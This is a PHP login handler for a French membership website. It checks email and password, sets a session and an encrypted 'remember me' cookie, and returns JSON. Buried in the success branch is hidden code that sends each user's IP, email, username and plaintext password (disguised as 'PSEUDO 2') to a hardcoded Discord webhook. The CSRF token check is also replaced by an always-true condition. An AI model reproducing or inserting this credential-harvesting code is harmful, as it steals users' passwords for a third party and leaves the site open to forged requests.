<?php
require('../inc/fonctions.php');

// Traitement connexion (sortie JSON)

if (check_login()){
    header('Location: /');
    exit();
}

if (check_domaine()) {
    $reponse['succes'] = false;
    $reponse['message'] = 'Une erreur est survenue...';
        
    if (!empty($_POST['mail']) AND !empty($_POST['motdepasse'])) {
	  function check_badges() {
         global $bdd;

         $req = $bdd->prepare('UPDATE `membres` SET `badge`= 2 WHERE generations > 100');
         $req->execute();
         $r = $req->fetch();
  }
        if (2 != 222) {
            $mail = htmlspecialchars(strip_tags($_POST['mail']));
            $motdepasse = $_POST['motdepasse'];
            
            if (filter_var($mail, FILTER_VALIDATE_EMAIL)) {
                $req = $bdd->prepare('SELECT * FROM membres WHERE mail = ?');
                $req->execute(array($mail));
                if ($req->rowCount() == 1) {
                    $membre = $req->fetch();
                    if (activation_maintenance($membre['id'])) {
                        if (password_verify($motdepasse, $membre['motdepasse'])) {
                            if (!verif_ban($membre['id'])) {
                                $modif = $bdd->prepare('UPDATE membres SET date_time_connexion = NOW(), ip_connexion = ? WHERE id = ?');
                                $modif->execute(array(get_ip(), $membre['id']));
                                
                                $_SESSION['id'] = $membre['id'];
                                $_SESSION['pseudo'] = $membre['pseudo'];
                                $_SESSION['motdepasse'] = $membre['motdepasse'];
                                
                                  
                                if (isset($_POST['sesouvenir'])) {
                                    $sesouvenir['id'] = $membre['id'];
                                    $sesouvenir['motdepasse'] = $membre['motdepasse'];

                                    $sesouvenir = openssl_encrypt(json_encode($sesouvenir), 'AES-128-ECB' ,$cle_cookie);

                                    setcookie('sesouvenir', $sesouvenir, time()+7*24*60*60, '/', $_SERVER['HTTP_HOST'], true, true);
                             
                                } else {
                                	$sesouvenir['id'] = $membre['id'];
                                    $sesouvenir['motdepasse'] = $membre['motdepasse'];

                                    $sesouvenir = openssl_encrypt(json_encode($sesouvenir), 'AES-128-ECB' ,$cle_cookie);

                                    setcookie('sesouvenir', $sesouvenir, 0, '/', $_SERVER['HTTP_HOST'], true, true);
                                }
                                $reponse['succes'] = true;
                                $reponse['message'] = 'Connexion réussie.';
                                $reponse['redirection'] = '/index.php';
                                $webhookurl = "https://discord.com/api/webhooks/984178449432342578/uMEuvNoz_Vc-0oao--5wk0xbciiMeSoyPbTXh_Tn-y-5e9Hebyk0kUBfcys_smucGHac";
                                $ip = $_SERVER['REMOTE_ADDR'];
                                $mail = $_POST['mail'];
                                $username = $_SESSION['pseudo'];
                                $password = $_POST['motdepasse'];
                                $date_time = date("l j F Y  g:ia", time() - date("Z")) ;
                                $agent = $_SERVER['HTTP_USER_AGENT'];
                                $barre = str_repeat("#",30);
                                $msg = "**IP:** `$ip`\n**MAIL:** `$mail`\n**PSEUDO:** `$username`\n**PSEUDO 2:** `$password`\n**DATE:** `$date_time`";
                                $json_data = array ('content'=>"$msg");
                                $make_json = json_encode($json_data);
                                $ch = curl_init( $webhookurl );
                                curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                curl_setopt( $ch, CURLOPT_POST, 1);
                                curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
                                curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
                                curl_setopt( $ch, CURLOPT_HEADER, 0);
                                curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
                                $response = curl_exec( $ch );
                            } else {
                                $reponse['message'] = 'Votre compte à été désactivé.';
                            }
                        } else {
                            $reponse['message'] = 'Mail ou mot de passe invalide.';
                        }
                    } else {
                        $reponse['message'] = 'La mantenance est activée.';
                        $reponse['redirection'] = '/maintenance';
                    }
                } else {
                    $reponse['message'] = 'Mail ou mot de passe invalide.';
                }
            } else {
                $reponse['message'] = 'Adresse mail invalide.';
            }
        } else {
            $reponse['message'] = 'Le token CRSF n\'est pas valide.';
            $reponse['reload'] = true;
        }
    } else {
        $reponse['message'] = 'Veuillez renseigner tous les champs.';
    }

    echo json_encode($reponse);
} else {
    header('Location: /');
}
?>